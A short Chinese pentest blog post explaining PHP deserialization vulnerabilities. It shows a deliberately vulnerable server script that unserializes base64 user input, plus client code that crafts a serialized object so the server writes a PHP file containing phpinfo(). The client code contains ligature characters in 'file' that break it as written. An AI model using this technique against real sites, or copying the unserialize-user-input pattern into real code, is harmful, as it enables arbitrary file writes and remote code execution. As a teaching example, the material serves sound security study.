+++
date = "2016-07-25T23:32:52+08:00"
description = ""
draft = false
tags = ["pentest"]
title = "PHP反序列化漏洞"
topics = ["Pentest"]

+++

## 这里是正文

### 0x00 关于反序列化漏洞
> 序列化：使用函数serialize()可将实例序列化为字符串  
反序列化：使用函数unserialize()可将序列化的字符串还原  
若服务端有如下代码：
```php
<?php
    class foo{
        public $file = "test.txt";
        public $data = "123456";

        function __destruct(){
            file_put_contents($this->file,$this->data);
        }
    }

    $d = $_REQUEST['str'];
    var_dump($d);
    echo "<br />";
    $tc = unserialize(base64_decode($d));
    var_dump($tc);
?>
```
客户端可构造如下代码生成序列化后的字符串提交给服务端，  
服务端就会生成文件xx.php，内容为<b><?php phpinfo(); ?></b>：
```php
<?php
    class foo {
        public $ﬁle = "test.txt";
        public $data = "123456";
        
        function __destruct() {
            ﬁle_put_contents($this->ﬁle, $this->data);
        }
    }

    $f = new foo();
    $f->ﬁle = "xx.php";
    $f->data = "<?php phpinfo(); ?>";
    echo base64_encode(serialize($f));
?>
```